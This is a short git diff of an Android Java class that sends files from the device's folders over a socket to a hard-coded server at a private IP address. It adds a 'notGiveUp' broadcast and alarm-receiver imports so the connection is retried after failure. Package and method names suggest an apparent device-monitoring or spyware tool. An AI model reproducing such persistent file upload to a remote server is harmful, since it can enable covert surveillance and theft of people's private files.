@@ -1,13 +1,18 @@
 package com.postal.omniscient.postal.downloadFiles;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.util.Log;
 
 import com.postal.omniscient.MainActivity;
 import com.postal.omniscient.postal.ThreadIsAliveOrNot;
 import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
 import com.postal.omniscient.postal.adapter.EventBusData;
+import com.postal.omniscient.postal.networkStateReceiver.ConnectCheckReceiver;
+import com.postal.omniscient.postal.service.AlarmReceiver;
 
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
@@ -40,16 +45,19 @@ public class DownloadFileRun implements Runnable {
     private File[] allFoldersFiles = null;
     private Boolean start_download_on_event = false;
     private Context context;
+    private final int SDK_INT = Build.VERSION.SDK_INT;
+    private Intent intent;
 
-    public DownloadFileRun(File[] allFoldersFiles, Context context) {
+    public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
         this.allFoldersFiles = allFoldersFiles;
         this.context = context;
+        this.intent = intent;
     }
 
     private void start() {
         EventBus.getDefault().register(this);
         AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
-        String server = "192.168.1.100";
+        String server = "192.168.1.109";
         int port = 2221;
 
         String isLoaded = "isLoaded ";
@@ -120,6 +128,7 @@ public class DownloadFileRun implements Runnable {
             } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
                 EventBus.getDefault().unregister(this);
                 dos.close();socket.close();
+                notGiveUp();
             }
         } catch (IOException e) {
             e.printStackTrace();
@@ -128,6 +137,14 @@ public class DownloadFileRun implements Runnable {
 
 
     }
+
+    private void notGiveUp() {
+
+        Log.i(Msg, "notGiveUp start ");
+        String requiredPermission = "notGiveUpConnectCheckReceiver";
+        context.sendBroadcast(intent, requiredPermission);
+    }
+
     @Subscribe(threadMode = ThreadMode.BACKGROUND)
     public void onComand(EventBusData event){
         start_download_on_event = true;
